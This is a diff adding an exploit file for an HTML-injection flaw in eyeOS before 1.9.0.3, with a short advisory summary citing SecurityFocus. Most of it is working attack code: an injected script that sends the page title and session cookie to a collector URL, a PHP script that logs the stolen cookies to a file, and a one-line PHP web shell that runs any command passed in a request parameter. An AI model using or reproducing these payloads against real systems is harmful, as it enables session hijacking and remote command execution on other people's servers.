@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/47629/info
+
+eyeOS is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input passed through image content before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+Versions prior to eyeOS 1.9.0.3 are vulnerable. 
+
+<!doctype html>
+<script>
+var http = new XMLHttpRequest()
+var url = "http://localhost/report.php?" + "user=" + top.document.title + "&cookie=" + document.cookie;
+http.open("GET", url, true);
+http.send("");
+</script>
+
+<?php
+$usercookies = fopen("usercookies", "a");
+fwrite($usercookies, "User: " . $_GET['user'] . "\t" ."Cookie: " . $_GET['cookie'] . "\n");
+?>
+
+<?php
+system($_GET['cmd']);
+?>
+
